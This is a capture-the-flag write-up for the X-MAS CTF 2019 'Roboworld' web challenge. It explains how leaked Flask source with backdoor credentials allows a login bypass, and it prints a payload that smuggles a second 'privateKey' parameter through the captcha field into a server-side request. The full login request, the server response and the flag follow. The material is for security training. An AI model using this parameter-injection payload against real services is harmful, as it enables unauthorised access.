# X-MAS CTF 2019 – Roboworld

* **Category:** web
* **Points:** 50

## Challenge

> A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(
> 
> Can you figure out what's wrong and access the secret files?
> 
> Remote server: http://challs.xmas.htsp.ro:11000
>
> Files: [leak.py](leak.py)
>
> Author: Reda

## Solution

The webpage contains the following HTML code.

```html
<head>
    <script>
        function captchaGenerateVerificationValue()
        {
            //Devnote:
            //Oops I broke the captcha verification function
            //so it will just generate random stuff for the verification value
            //hope no one notices :O

            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            result = ""
            for ( var i = 0; i < 10; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }

            document.getElementById("captcha").value = result
        }
    </script>
</head>

Login:

<form method="post" action="/login">
    Username: <input type="text" name="user" /><br>
    Password: <input type="password" name="pass" /><br>
    Captcha: <input id="captcha" onchange="captchaGenerateVerificationValue()" type="checkbox" name="captcha_verification_value" value="" /> I am not a robot <br>
    <input type="submit" value="Login" /><br>
</form>
```

So the CAPTCHA checkbox produces random string.

Analyzing the [leak.py](leak.py) file you can discover that the following credentials are used to login:
* username: `backd00r`;
* password: `catsrcool`.

```python
from flask import Flask, render_template, request, session, redirect
import os
import requests
from captcha import verifyCaptchaValue

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('user')
    password = request.form.get('pass')
    captchaToken = request.form.get('captcha_verification_value')

    privKey = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" #redacted
    r = requests.get('http://127.0.0.1:{}/captchaVerify?captchaUserValue={}&privateKey={}'.format(str(port), captchaToken, privKey))
    #backdoored ;)))
    if username == "backd00r" and password == "catsrcool" and r.content == b'allow':
        session['logged'] = True
        return redirect('//redacted//')
    else:
        return "login failed"


@app.route('/captchaVerify')
def captchaVerify():
    #only 127.0.0.1 has access
    if request.remote_addr != "127.0.0.1":
        return "Access denied"

    token = request.args.get('captchaUserValue')
    privKey = request.args.get('privateKey')
    #TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system
    if(verifyCaptchaValue(token, privKey)):
        return str("allow")
    else:
        return str("deny")
```

Then you have to beat an HTTP GET service available only on localhost. It consumes the CAPTCHA token and a private key that is redacted in the source code.

A TODO comment claims that there is a debugging private key for used for testing: `8EE86735658A9CE426EAF4E26BB0450E`. This seems to be the MD5 of the string: `fuckingdog`.

You can manipulate the link used in the `requests.get` operation, via CAPTCHA parameter, excluding the existing private key parameter through `#` and forcing the debugging private key.

The payload is the following.

```
pwned&privateKey=8EE86735658A9CE426EAF4E26BB0450E#
```

So the following HTTP request can be used.

```
POST /login HTTP/1.1
Host: challs.xmas.htsp.ro:11000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://challs.xmas.htsp.ro:11000
Connection: close
Referer: http://challs.xmas.htsp.ro:11000/
Upgrade-Insecure-Requests: 1

user=backd00r&pass=catsrcool&captcha_verification_value=pwned%26privateKey%3D8EE86735658A9CE426EAF4E26BB0450E%23

HTTP/1.1 302 FOUND
Server: nginx
Date: Mon, 16 Dec 2019 21:48:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 251
Location: http://challs.xmas.htsp.ro:11000/dashboard_jidcc88574c
Connection: close
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWQiOnRydWV9.Xff7wQ.nX353pLhy-6ES9lB32QOopGmz-Y; HttpOnly; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/dashboard_jidcc88574c">/dashboard_jidcc88574c</a>.  If not click the link.
```

The page where you will be redirect is the following

```html
<h2>Welcome to the secret website where we store secret stuff</h2>
<br>
<br>
Secret Stuff:
<br>
<a href="/static/hidden_directory_1337_781/098c533dc5420628a9f51c1911198c4c.jpg">098c533dc5420628a9f51c1911198c4c.jpg</a>
<br>
<a href="/static/hidden_directory_1337_781/2.jpg">2.jpg</a>
<br>
<a href="/wtf.mp4">wtf.mp4</a>
```
It will contain three files:
* [098c533dc5420628a9f51c1911198c4c.jpg](098c533dc5420628a9f51c1911198c4c.jpg);
* [2.jpg](2.jpg);
* [wtf.mp4](wtf.mp4).

Inside the [wtf.mp4](wtf.mp4) video there is the flag, reversed in order.

```
X-MAS{Am_1_Th3_R0bot?_0.o}
```